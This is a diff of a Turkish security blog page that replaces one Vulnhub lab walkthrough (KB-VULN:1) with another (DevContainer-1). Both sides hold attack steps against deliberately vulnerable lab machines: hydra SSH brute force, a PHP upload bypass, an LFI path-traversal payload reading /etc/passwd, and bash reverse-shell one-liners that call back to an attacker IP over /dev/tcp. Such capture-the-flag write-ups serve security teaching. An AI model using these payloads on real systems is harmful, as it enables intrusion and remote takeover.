@@ -5,17 +5,17 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Barcode">
-<meta name="description" content="Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
-1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.  netdiscover -i eth0  Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir." />
-<meta name="keywords" content=", Vulnhub, write-up, ssh, nmap, hydra" />
+<meta name="description" content="1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.  netdiscover -i eth1  Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
+Tarayıcı ile web servisine istek atılır. Açılan sayfa ve kaynak kodları incelendiğinde olağan dışı bir bilgiye görülmemektedir.  Gobuster aracı ile Web dizin taraması gerçekleştirilir." />
+<meta name="keywords" content=", Vulnhub, write-up, Docker, Container, sudo, lfi, burp suite" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
-<link rel="canonical" href="https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/" />
+<link rel="canonical" href="https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/" />
 
 
     <title>
         
-            VULNHUB KB VULN:1 Makinası Write Up :: Cyber Security Blog  — Welcome the My Blog
+            VULN DevContainer-1 Write Up :: Cyber Security Blog  — Welcome the My Blog
         
     </title>
 
@@ -46,32 +46,32 @@
 
 
 
-<meta itemprop="name" content="VULNHUB KB VULN:1 Makinası Write Up">
-<meta itemprop="description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/kb-vuln-1,540/) &#39;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim.Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...">
-<meta itemprop="datePublished" content="2020-09-17T20:40:54+03:00" />
-<meta itemprop="dateModified" content="2020-09-17T23:07:56+03:00" />
-<meta itemprop="wordCount" content="640">
+<meta itemprop="name" content="VULN DevContainer-1 Write Up">
+<meta itemprop="description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/devcontainer-1,548/) &#39;da yer alan medium seviye DevContainer-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...">
+<meta itemprop="datePublished" content="2020-09-21T22:53:05+03:00" />
+<meta itemprop="dateModified" content="2020-09-22T01:18:01+03:00" />
+<meta itemprop="wordCount" content="367">
 <meta itemprop="image" content="https://barcode91.github.io"/>
 
 
 
-<meta itemprop="keywords" content="Vulnhub,write-up,ssh,nmap,hydra," />
+<meta itemprop="keywords" content="Vulnhub,write-up,Docker,Container,sudo,lfi,burp suite," />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://barcode91.github.io"/>
 
-<meta name="twitter:title" content="VULNHUB KB VULN:1 Makinası Write Up"/>
-<meta name="twitter:description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/kb-vuln-1,540/) &#39;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim.Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar..."/>
+<meta name="twitter:title" content="VULN DevContainer-1 Write Up"/>
+<meta name="twitter:description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/devcontainer-1,548/) &#39;da yer alan medium seviye DevContainer-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."/>
 
 
 
 
 
-    <meta property="article:section" content="Write-up" />
+    <meta property="article:section" content="write-up" />
 
 
 
-    <meta property="article:published_time" content="2020-09-17 20:40:54 &#43;0300 &#43;03" />
+    <meta property="article:published_time" content="2020-09-21 22:53:05 &#43;0300 &#43;03" />
 
 
 
@@ -151,7 +151,7 @@
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        4 minutes
+        2 minutes
 
         
       </p>
@@ -159,190 +159,144 @@
 
     <article>
       <h1 class="post-title">
-        <a href="https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/">VULNHUB KB VULN:1 Makinası Write Up</a>
+        <a href="https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/">VULN DevContainer-1 Write Up</a>
       </h1>
 
       
-        <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/cover.png" class="center cover" />
+        <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/cover.png" class="center cover" />
       
-        <hr />
-        <aside id="toc">
-          <div class="toc-title">Table of Contents</div>
-          <nav id="TableOfContents">
-  <ul>
-    <li><a href="#1-keşif-aşaması">1. Keşif Aşaması</a></li>
-    <li><a href="#2-erişim-sağlanması">2. Erişim Sağlanması</a></li>
-    <li><a href="#3-yetki-yükseltme">3. Yetki Yükseltme</a></li>
-  </ul>
-</nav>
-        </aside>
-        <hr />
 
       
 
       <div class="post-content">
         
-        <p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/kb-vuln-1,540/">VULNHUB</a> &lsquo;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
-<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+        <h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
 
 
 <div style="text-align:justify;">
 Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
 </div>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth0
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
 </code></pre></div>
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/discover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
 <p>Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
-<p>
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
-
-
-
-<div style="text-align:justify;">
-Ftp portunda çalışan servisin konfigürasyon ayarları varsayılan olarak bırakıldığı için anonymous erişim açıktır. Ftp servisine bağlanılır ve paylaşıma açık dosyalar incelenir.
-</div>
-
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/ftp1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
-
-</p>
-<p><strong>.bash_history</strong> adlı dosya bilgisayara indirilir.</p>
-<p>
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/ftp2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
-
-
-
-
-<div style="text-align:justify;">
-İndirilen dosyanın içeriğine bakıldığından ssh vb. erişimlerde kullanıcıya verilen karşılama mesajının (Günün Mesajı-Message Of The Day(motd)) yer aldığı <i style="color:yellow"> <strong> 00-header </strong></i> dosyasında değişiklik yapıldığı görülmektedir. Yetki yükseltme aşamasında kullanılabilir.
-<br>
-</div>
-
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/file.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
-
-</p>
-<p>Tarayıcı ile web servisine istek atılır. Oneschool adlı bir web sayfası açılmaktadır. Sayfa kaynak kodları incelendiğinde bir kullanıcı adı tespit edilmektedir.</p>
-<p>
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
 
 
 <div style="text-align:justify;">
 <br>
+Tarayıcı ile web servisine istek atılır. Açılan sayfa ve kaynak kodları incelendiğinde olağan dışı bir bilgiye görülmemektedir.
+<br>
+<br>
 </div>
 
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/websource.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
+<p>Gobuster aracı ile Web dizin taraması gerçekleştirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirb/big.txt 
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
-<div style="text-align:justify;">
-Web dizininde gobuser ile dizin taraması gerçekleştirilir. Yapılan dizin ve alt dizin taramalarında ilk erişim için parola yada giriş paneli tespit edilememiştir. Elde edilen kullanıcı adı ile hydra aracı ile ssh servisine brute force saldırı yapılır.
-</div></p>
-<pre><code class="language-terminal" data-lang="terminal">hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
-</code></pre>
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+<p><strong>Upload</strong> dizini dikkat çekmektedir. Tarayıcıdan istek atıldığında upload sayfası karşılamaktadır. İzin verilen dosya uzantıları ekranda yazılmaktadır.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/upload.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Burpsuite uygulaması açılır ve normal bir resim dosyası yüklendiğinde giden istek incelenir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/normal.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Php uzantılı dosya yüklendiğinde giden isteğin <em><strong>Content-type</strong></em> değeri <em><strong>image/gif</strong></em> şeklinde değiştirilerek deneme yapılır. Yükleme işlemi başarılı bir şekilde gerçekleşmektedir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/son.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
 <h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
-<p>Elde edilen parola ile ssh erişimi sağlanır.</p>
-<pre><code class="language-terminal" data-lang="terminal">[barcode@parrot]─[~]$ ssh sysadmin@192.168.56.102
-The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
-ECDSA key fingerprint is SHA256:9z5jY109u48eo71sMGnTp9s13QY0KGVMI9B/m2mkCZs.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.56.102' (ECDSA) to the list of known hosts.
-sysadmin@192.168.56.102's password: 
+<p>İlgili port dinlenmeye alınarak upload ekranında yer alan index yazısına tıklanarak yüklenen dosya çağırılır ve reverse shell alınır.</p>
 
-			WELCOME TO THE KB-SERVER
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
-Last login: Sat Aug 22 18:00:48 2020
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
 
-sysadmin@kb-server:~$
-</code></pre><p>sysadmin kullanıcısına ait home dizininde yer alan dosyalar listelenir ve user.txt dosyası okunarak ilk flag elde edilir.</p>
+<p><em><strong>/etc/passwd</strong></em> dosyası görüntülenerek sistemdeki kullanılar tespit edilir. Login olabilecek kullanıcı gözükmemektedir. Bu durumda bir container içerisinde olduğumuz tespit edilir.</p>
 
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/etc.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Web uygulamasının çalıştığı <em><strong>/var/www/html</strong></em> dizine geçilir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/dizin.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>Maintenance-Web-Docker</strong> dizini dikkat çekmektedir. Dizine girilerek içerisinde yer alan alan dosyalar incelenir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/webdocker.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<pre><code class="language-terminal" data-lang="terminal">cat maintenance.sh
+
+#!/bin/bash
+#Version 1.0
+#This script monitors the uploaded files. It is a reverse shell monitoring measure.
+#path= /home/richard/web/webapp/upload/files/
+/home/richard/web/Maintenance-Web-Docker/list.sh
+
+
+cat list.sh
+
+#!/bin/bash
+date &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
+ls /home/richard/web/upload/files/ | wc -l &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
+</code></pre><p>Dockerda yer alan <strong>www</strong> dizini ile <strong>/home/richard/web/</strong> dizini birbirine volume oluşturularak bağlanmıştır. List.sh dosyası shell alınacak şekilde düzenir ve çalıştırılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -i &amp;&gt;/dev/tcp/192.168.56.105/7777 0&gt;&amp;1&#34;</span> &gt; list.sh
+</code></pre></div><p>7777 numaralı port dinlenir ve bağlantı sağlanır.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/rev.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>User.txt dosyası okunarak ilk aşama tamamlanır.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
 <h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
-<p>İlk olarak <em><strong>/etc/update-motd.d/</strong></em> dizinine gidilir ve 00-header dosyasının izinleri kontrol edilir.</p>
-<pre><code class="language-terminal" data-lang="terminal">sysadmin@kb-server:~$ cd /etc/update-motd.d/
-sysadmin@kb-server:/etc/update-motd.d$ ls -lsa
-total 16
-4 drwxr-xr-x  3 root root 4096 Aug 22 17:08 .
-4 drwxr-xr-x 92 root root 4096 Sep 11 08:24 ..
-4 -rwxrwxrwx  1 root root  989 Aug 22 17:08 00-header
-4 drwxr-xr-x  2 root root 4096 Aug 22 17:07 other
-</code></pre><p>00-header dosyasında tüm kullanıcılara yazma yetkisi verildiği görülmektedir. Normal kullanımda bu yetki sadece root yetkisinde olmaktadır. Dosya içeriği görüntülenir.</p>
+<p>Sudo -l komutu ile yetkiler kontrol edilir.</p>
 
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/header1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
-<p>Ssh erişiminde çalışan dosyanın hangi kullanıcı yetkisi ile çalıştırıldığının tespiti için whoami komutu eklenir.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;whoami&#34;</span> &gt;&gt; 00-header
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sysadmin@kb-server:/etc/update-motd.d$ cat 00-header 
-<span style="color:#75715e">#!/bin/sh</span>
-#
-<span style="color:#75715e">#    00-header - create the header of the MOTD</span>
-<span style="color:#75715e">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
-#
-<span style="color:#75715e">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
-#
-<span style="color:#75715e">#    This program is free software; you can redistribute it and/or modify</span>
-<span style="color:#75715e">#    it under the terms of the GNU General Public License as published by</span>
-<span style="color:#75715e">#    the Free Software Foundation; either version 2 of the License, or</span>
-<span style="color:#75715e">#    (at your option) any later version.</span>
-#
-<span style="color:#75715e">#    This program is distributed in the hope that it will be useful,</span>
-<span style="color:#75715e">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
-<span style="color:#75715e">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
-<span style="color:#75715e">#    GNU General Public License for more details.</span>
-#
-<span style="color:#75715e">#    You should have received a copy of the GNU General Public License along</span>
-<span style="color:#75715e">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
-<span style="color:#75715e">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
+<p>Parola gerektirmeden root yetkisi ile socat uygulamasının çalıştırılabildiği görülmektedir. <strong>TCP-LISTEN 8080</strong> ile 8080 portuna gelen bağlantılar dinlenir, <strong>fork</strong> ile gelen bağlantılar 90 portuna yönlendirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u root /home/richard/HackTools/socat TCP-LISTEN<span style="color:#ae81ff">\:</span>8080<span style="color:#ae81ff">\,</span>fork TCP<span style="color:#ae81ff">\:</span>127.0.0.1<span style="color:#ae81ff">\:</span><span style="color:#ae81ff">90</span>
+</code></pre></div><p>Komut çalıştırıldığında 8080 portu gelen bağlantılar için dinlenmeye başlanır. Tarayıcıdan <em>http://makianaipsi:8080</em> istek atıldığında web sayfası açılır.</p>
 
-<span style="color:#f92672">[</span> -r /etc/lsb-release <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> . /etc/lsb-release
-
-echo <span style="color:#e6db74">&#34;\n\t\t\tWELCOME TO THE KB-SERVER\n&#34;</span>
-whoami
-</code></pre></div><p>Ssh bağlantısı kesilip tekrardan erişim sağlandığında 00-header dosyası içerisinde çalıştırılan dosyaların root yetkisi ile çalıştırıldığı görülmektedir.</p>
-<pre><code class="language-terminal" data-lang="terminal">sysadmin@192.168.56.102's password: 
-
-			WELCOME TO THE KB-SERVER
-
-root &lt;--- Eklenen komut Çıktısı
-Last login: Thu Sep 17 19:06:26 2020 from 192.168.56.1
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
-</code></pre><p>Yüksek yetki ile shell bağlantısı sağlamak için 00-header dosyasına aşağıda yer alan komut eklenir ve tekrar erişim sağlanıldığında 4444 numaralı porta shell bağlantısı düşmektedir.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.56.101/4444 &lt;&amp;1&#39;&#34;</span> &gt;&gt; 00-header 
-</code></pre></div>
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/header2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
+<p>Sayfada yer alan linklere tıklandığında lfi açığı olabileceği tespit edilir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/lfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
-<div style="text-align:justify;">
-<br>
-</div>
+<p><em><strong>view=../../../../../../etc/passwd</strong></em> parametre girilerek lfi açığı varlığı tespit edilir. Görüldüğü gibi include işlemi başarılı gerçekleşmiş ve passwd dosyası okunmuştur.</p>
 
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/passwd.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
+<p>İlk etapta upload ettiğimiz shell dosyası <strong>../upload/files</strong> klasörü altındadır. O dosya tekrar çağırılarak bağlantı alınır.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/shell2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
-<div style="text-align:justify;">
-<br>
-Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamamlanır.
+<p>/root dizinine geçilir ve dizin listenir ve çözüm tamamlanır.</p>
 
-</div>
-
-    <img src="https://barcode91.github.io/images/vulnhub/kb-vuln1/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+    <img src="https://barcode91.github.io/images/vulnhub/devcontainer1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
 
 
 
@@ -357,7 +311,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
             <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
             <line x1="7" y1="7" x2="7" y2="7"></line>
-          </svg><span class="tag"><a href="https://barcode91.github.io/tags/vulnhub/">Vulnhub</a></span><span class="tag"><a href="https://barcode91.github.io/tags/write-up/">write-up</a></span><span class="tag"><a href="https://barcode91.github.io/tags/ssh/">ssh</a></span><span class="tag"><a href="https://barcode91.github.io/tags/nmap/">nmap</a></span><span class="tag"><a href="https://barcode91.github.io/tags/hydra/">hydra</a></span>
+          </svg><span class="tag"><a href="https://barcode91.github.io/tags/vulnhub/">Vulnhub</a></span><span class="tag"><a href="https://barcode91.github.io/tags/write-up/">write-up</a></span><span class="tag"><a href="https://barcode91.github.io/tags/docker/">Docker</a></span><span class="tag"><a href="https://barcode91.github.io/tags/container/">Container</a></span><span class="tag"><a href="https://barcode91.github.io/tags/sudo/">sudo</a></span><span class="tag"><a href="https://barcode91.github.io/tags/lfi/">lfi</a></span><span class="tag"><a href="https://barcode91.github.io/tags/burp-suite/">burp suite</a></span>
         </p>
 
       <p>
@@ -368,7 +322,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        640 Words
+        367 Words
       </p>
 
       <p>
@@ -378,7 +332,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
           <line x1="8" y1="2" x2="8" y2="6"></line>
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
-        2020-09-17 20:40 &#43;0300
+        2020-09-21 22:53 &#43;0300
       </p>
 
       
@@ -386,7 +340,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -394,7 +348,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -403,7 +357,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up&amp;caption=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up&amp;canonicalUrl=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=VULN%20DevContainer-1%20Write%20Up&amp;caption=VULN%20DevContainer-1%20Write%20Up&amp;canonicalUrl=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -412,7 +366,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up&amp;body=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=VULN%20DevContainer-1%20Write%20Up&amp;body=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -420,7 +374,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
